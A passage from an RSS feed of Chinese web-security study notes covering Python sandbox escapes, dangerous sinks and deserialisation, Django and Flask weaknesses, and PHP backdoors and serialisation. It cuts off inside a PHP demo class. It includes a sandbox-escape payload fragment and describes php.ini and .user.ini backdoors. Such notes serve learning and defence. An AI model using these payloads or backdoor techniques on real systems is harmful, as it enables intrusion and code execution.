&lt;h1 id=&#34;沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h1&gt;
&lt;h2 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; 常用函数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;eval / exec / compile&lt;/li&gt;
&lt;li&gt;dir / type&lt;/li&gt;
&lt;li&gt;globals / locals / vars&lt;/li&gt;
&lt;li&gt;getattr / setattr&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;导入包方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#导入包方式&#34;&gt;#&lt;/a&gt; 导入包方式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;import os&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;from os import *&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__import__(&amp;quot;os&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;importlib&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;imp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;reload(os)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;execfile&lt;/code&gt;  仅 Python2 支持&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dir(__builtins__)&lt;/code&gt;  查看内置模块&lt;/li&gt;
&lt;li&gt;最简单的思路是在已有的模块中 import，如果那个模块中已经 import 可以利用的模块就可以使用了&lt;/li&gt;
&lt;li&gt;在父类中寻找可用的模块，最常见 payload 是  &lt;code&gt;().__class__.__bases__[0].__subclasses__()&lt;/code&gt;  或者用魔术方法获取全局作用域  &lt;code&gt;__init__.__func__.__globals__&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用  &lt;code&gt;https://gist.github.com/freddyb/3360650&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;有的沙箱把相关的模块代码都被删除了，则可以使用 libc 中的函数，Python 中调用一般可以使用 ctypes 或者 cffi。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;A&amp;quot;&amp;quot;B&amp;quot; == &amp;quot;AB&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h2&gt;
&lt;p&gt;Python 官方给出了一些防御的建议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 Jython 并尝试使用 Java 平台来锁定程序的权限&lt;/li&gt;
&lt;li&gt;使用 fakeroot 来避免&lt;/li&gt;
&lt;li&gt;使用一些 rootjail 的技术&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架&#34;&gt;#&lt;/a&gt; 框架&lt;/h1&gt;
&lt;h2 id=&#34;django&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#django&#34;&gt;#&lt;/a&gt; Django&lt;/h2&gt;
&lt;h3 id=&#34;历史漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#历史漏洞&#34;&gt;#&lt;/a&gt; 历史漏洞&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzU4Lw==&#34;&gt;CVE-2016-7401 CSRF Bypass&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGphbmdvcHJvamVjdC5jb20vd2VibG9nLzIwMTcvYXByLzA0L3NlY3VyaXR5LXJlbGVhc2VzLw==&#34;&gt;CVE-2017-7233/7234 Open redirect vulnerability&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZGphbmdvLWRlYnVnLXBhZ2UteHNzLmh0bWw=&#34;&gt;CVE-2017-12794 debug page XSS&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置相关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置相关&#34;&gt;#&lt;/a&gt; 配置相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Nginx 在为 Django 做反向代理时，静态文件目录配置错误会导致源码泄露。访问 /static.. 会 301 重定向到 /static../&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;flask&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flask&#34;&gt;#&lt;/a&gt; Flask&lt;/h2&gt;
&lt;p&gt;Flask 默认使用客户端 session，使得 session 可以被伪造&lt;/p&gt;
&lt;h1 id=&#34;代码混淆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码混淆&#34;&gt;#&lt;/a&gt; 代码混淆&lt;/h1&gt;
&lt;h2 id=&#34;常见混淆方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见混淆方式&#34;&gt;#&lt;/a&gt; 常见混淆方式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基于 AST 变换&lt;/li&gt;
&lt;li&gt;编译为 pyc 文件&lt;/li&gt;
&lt;li&gt;Pyinstaller&lt;/li&gt;
&lt;li&gt;PyArmor&lt;/li&gt;
&lt;li&gt;通过 AES 加密为 pye 文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sink&#34;&gt;#&lt;/a&gt; Sink&lt;/h1&gt;
&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;asyncio.new_event_loop().subprocess_exec&lt;/li&gt;
&lt;li&gt;asyncio.subprocess&lt;/li&gt;
&lt;li&gt;bdb.os&lt;/li&gt;
&lt;li&gt;cgi.os.system&lt;/li&gt;
&lt;li&gt;cgi.sys&lt;/li&gt;
&lt;li&gt;code.InteractiveInterpreter&lt;/li&gt;
&lt;li&gt;commands&lt;/li&gt;
&lt;li&gt;ctypes.CDLL&lt;/li&gt;
&lt;li&gt;eval&lt;/li&gt;
&lt;li&gt;exec&lt;/li&gt;
&lt;li&gt;execfile&lt;/li&gt;
&lt;li&gt;input // python2 only&lt;/li&gt;
&lt;li&gt;os.exec&lt;/li&gt;
&lt;li&gt;os.exec*&lt;/li&gt;
&lt;li&gt;os.fork&lt;/li&gt;
&lt;li&gt;os.popen&lt;/li&gt;
&lt;li&gt;os.spawn&lt;/li&gt;
&lt;li&gt;os.system&lt;/li&gt;
&lt;li&gt;platform.os&lt;/li&gt;
&lt;li&gt;platform.popen&lt;/li&gt;
&lt;li&gt;platform.sys&lt;/li&gt;
&lt;li&gt;popen2&lt;/li&gt;
&lt;li&gt;pty.os&lt;/li&gt;
&lt;li&gt;pty.spawn&lt;/li&gt;
&lt;li&gt;subprocess&lt;/li&gt;
&lt;li&gt;timeit.sys&lt;/li&gt;
&lt;li&gt;timeit.timeit&lt;/li&gt;
&lt;li&gt;typing.get_type_hints() +  &lt;code&gt;__annotations__&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件读取&#34;&gt;#&lt;/a&gt; 文件读取&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;open&lt;/li&gt;
&lt;li&gt;os.open&lt;/li&gt;
&lt;li&gt;urllib.request.urlopen(&#39;[file:///](file:///)&#39;)&lt;/li&gt;
&lt;li&gt;codecs.open&lt;/li&gt;
&lt;li&gt;fileinput&lt;/li&gt;
&lt;li&gt;仅 Python2
&lt;ul&gt;
&lt;li&gt;types.FileType&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;危险第三方库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#危险第三方库&#34;&gt;#&lt;/a&gt; 危险第三方库&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Template&lt;/li&gt;
&lt;li&gt;subprocess32&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;反序列化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-2&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;marshal&lt;/li&gt;
&lt;li&gt;PyYAML&lt;/li&gt;
&lt;li&gt;pickle&lt;/li&gt;
&lt;li&gt;cPickle&lt;/li&gt;
&lt;li&gt;shelve&lt;/li&gt;
&lt;li&gt;PIL&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;反序列化-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-3&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy85NTc2Lmh0bWw=&#34;&gt;Python pickle 反序列化&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93aWtpLnB5dGhvbi5vcmcvbW9pbi9TYW5kYm94ZWRQeXRob24=&#34;&gt;Python 沙箱 官方 wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;[Python eval 的常见错误封装及利用原理](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h4bGVnZW5kLmNvbS8yMDE1LzA3LzMxL1B5dGhvbg==&#34;&gt;http://xxlegend.com/2015/07/31/Python&lt;/span&gt; eval 的常见错误封装及利用原理 /)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3BpY2tsZS5odG1s&#34;&gt;pickle Python 对象序列化&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTEvU2xhdmllcm8vQkhfVVNfMTFfU2xhdmllcm9fU291cl9QaWNrbGVzX1NsaWRlcy5wZGY=&#34;&gt;Sour Pickles A serialised exploitation guide in one part&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ydXNodGVyLmNvbS9ibG9nL3BpY2tsZS1zZXJpYWxpemF0aW9uLWludGVybmFscy8=&#34;&gt;How pickle works in Python&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;沙箱-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱-2&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODYzNjY=&#34;&gt;Python 沙箱通用绕过&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMzIwOC5odG1s&#34;&gt;一文看懂 Python 沙箱逃逸&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;格式化字符串-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#格式化字符串-2&#34;&gt;#&lt;/a&gt; 格式化字符串&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vcHl0aG9uLXN0cmluZy1mb3JtYXQtdnVsbmVyYWJpbGl0eS5odG1s&#34;&gt;Python 字符串格式化漏洞&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2x1Y3Vtci5wb2Nvby5vcmcvMjAxNi8xMi8yOS9jYXJlZnVsLXdpdGgtc3RyLWZvcm1hdC8=&#34;&gt;Be Careful with Python&#39;s New-Style String Format&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;综合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#综合&#34;&gt;#&lt;/a&gt; 综合&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ZzdGlubmVyL3B5dGhvbi1zZWN1cml0eS5naXQ=&#34;&gt;python security&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vcHl0aG9uX3NlYw==&#34;&gt;Python 安全和代码审计相关资料收集&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PHP/</guid>
            <title>PHP</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/PHP/</link>
            <category>语言</category>
            <category>反序列化</category>
            <category>PHP</category>
            <pubDate>Sun, 27 Nov 2022 15:53:16 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门&#34;&gt;#&lt;/a&gt; 后门&lt;/h1&gt;
&lt;h2 id=&#34;phpini构成的后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpini构成的后门&#34;&gt;#&lt;/a&gt; php.ini 构成的后门&lt;/h2&gt;
&lt;p&gt;利用 auto_prepend_file 和 include_path&lt;/p&gt;
&lt;h2 id=&#34;userini文件构成的php后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#userini文件构成的php后门&#34;&gt;#&lt;/a&gt; .user.ini 文件构成的 PHP 后门&lt;/h2&gt;
&lt;p&gt;.user.ini 可运行于所有以 fastcgi 运行的 server。 利用方式同 php.ini&lt;/p&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;php序列化实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php序列化实现&#34;&gt;#&lt;/a&gt; PHP 序列化实现&lt;/h2&gt;
&lt;h3 id=&#34;常见处理器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见处理器&#34;&gt;#&lt;/a&gt; 常见处理器&lt;/h3&gt;
&lt;p&gt;PHP 序列化处理共有几种，分别为 php、php_serialize、php_binary 和 WDDX (需要编译时开启支持)，默认为 php，可通过配置中的  &lt;code&gt;session.serialize_handler&lt;/code&gt;  修改。&lt;/p&gt;
&lt;p&gt;如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX 从 PHP 7.4 版本后开始弃用。从 PHP 5.5.4 起可以使用 php_serialize。 php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并且不会有 php 和 php_binary 所具有的限制。&lt;/p&gt;
&lt;p&gt;其中 PHP 处理器的格式为：键名 + 竖线 + 经过 serialize () 函数序列化处理的值。&lt;/p&gt;
&lt;p&gt;其中 php_binary 处理器的格式为：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值。&lt;/p&gt;
&lt;p&gt;其中 php_serialize 处理器的格式为：经过 serialize () 函数序列化处理的数组。&lt;/p&gt;
&lt;h3 id=&#34;序列化格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#序列化格式&#34;&gt;#&lt;/a&gt; 序列化格式&lt;/h3&gt;
&lt;p&gt;其中 php_serialize 的实现在  &lt;code&gt;php-src/ext/standard/var.c&lt;/code&gt;  中，主要函数为  &lt;code&gt;php_var_serialize_intern&lt;/code&gt;  ，序列化后的格式如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;boolean
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;b:&amp;lt;value&amp;gt;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b:1;&lt;/code&gt;  // true&lt;/li&gt;
&lt;li&gt;&lt;code&gt;b:0;&lt;/code&gt;  // false&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;integer
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;i:&amp;lt;value&amp;gt;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;double
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;d:&amp;lt;value&amp;gt;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NULL
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;N;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;string
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;s:&amp;lt;length&amp;gt;:&amp;quot;&amp;lt;value&amp;gt;&amp;quot;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;s:1:&amp;quot;s&amp;quot;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;array
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a:&amp;lt;length&amp;gt;:&amp;#123;key, value&amp;#125;;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;a:1:&amp;#123;s:4:&amp;quot;key1&amp;quot;;s:6:&amp;quot;value1&amp;quot;;&amp;#125;&lt;/code&gt;  //  &lt;code&gt;array(&amp;quot;key1&amp;quot; =&amp;gt; &amp;quot;value1&amp;quot;);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;object
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;O:&amp;lt;class_name_length&amp;gt;:&amp;quot;&amp;lt;class_name&amp;gt;&amp;quot;:&amp;lt;number_of_properties&amp;gt;:&amp;#123;&amp;lt;properties&amp;gt;&amp;#125;;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;reference
&lt;ul&gt;
&lt;li&gt;指针类型&lt;/li&gt;
&lt;li&gt;&lt;code&gt;R:reference;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``O:1:&amp;quot;A&amp;quot;:2:{s:1:&amp;quot;a&amp;quot;;i:1;s:1:&amp;quot;b&amp;quot;;R:2;}`&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$a = new A();$a-&amp;gt;a=1;$a-&amp;gt;b=&amp;amp;$a-&amp;gt;a;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;private与protect&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#private与protect&#34;&gt;#&lt;/a&gt; private 与 protect&lt;/h3&gt;
&lt;p&gt;private 与 protect 变量和 public 变量不同，不能直接设置。&lt;/p&gt;
&lt;p&gt;private 属性只能在其被定义的类内部访问，且不会被继承，在属性前加上类名，即  &lt;code&gt;%00className%00&lt;/code&gt;  用于标定其是私有的。&lt;/p&gt;
&lt;p&gt;protected 属性可以在父类和子类中访问，变量前添加  &lt;code&gt;%00*%00&lt;/code&gt;  用于标定其是受保护的。&lt;/p&gt;
&lt;h2 id=&#34;php反序列化漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php反序列化漏洞&#34;&gt;#&lt;/a&gt; PHP 反序列化漏洞&lt;/h2&gt;
&lt;p&gt;php 在反序列化的时候会调用  &lt;code&gt;__wakeup&lt;/code&gt;  /  &lt;code&gt;__sleep&lt;/code&gt;  等函数，可能会造成代码执行等问题。若没有相关函数，在析构时也会调用相关的析构函数，同样会造成代码执行。&lt;/p&gt;
&lt;p&gt;另外  &lt;code&gt;__toString&lt;/code&gt;  /  &lt;code&gt;__call&lt;/code&gt;  两个函数也有利用的可能。&lt;/p&gt;
&lt;p&gt;其中  &lt;code&gt;__wakeup&lt;/code&gt;  在反序列化时被触发， &lt;code&gt;__destruct&lt;/code&gt;  在 GC 时被触发，  &lt;code&gt;__toString&lt;/code&gt;  在 echo 时被触发， &lt;code&gt;__call&lt;/code&gt;  在一个未被定义的函数调用时被触发。&lt;/p&gt;
&lt;p&gt;下面提供一个简单的 demo.&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;Demo&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;construct&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;wake up&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Data&#39;s value is &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt;&lt;/span&gt;. &amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;destruct&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token 